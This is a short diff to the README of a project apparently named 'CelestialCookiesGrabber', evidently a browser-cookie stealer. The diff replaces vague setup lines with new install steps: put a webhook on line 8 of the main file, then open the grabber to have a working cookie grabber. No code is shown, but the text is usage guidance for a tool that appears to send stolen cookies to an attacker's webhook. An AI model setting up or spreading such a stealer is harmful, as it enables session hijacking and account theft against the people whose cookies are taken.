@@ -1,11 +1,8 @@
 # CelestialCookiesGrabber-
 How to Install
-- #### then install everything and open start tool
-- #### configure what does it ask you
-- #### and you have your own nuclear
-
-
-
+-#### First Put Webook on Main: "WEBOOK HERE"  Text Line 8 
+-#### After Open CelestialGrabber 
+-#### You have your CookiesGrabber
 
 
 
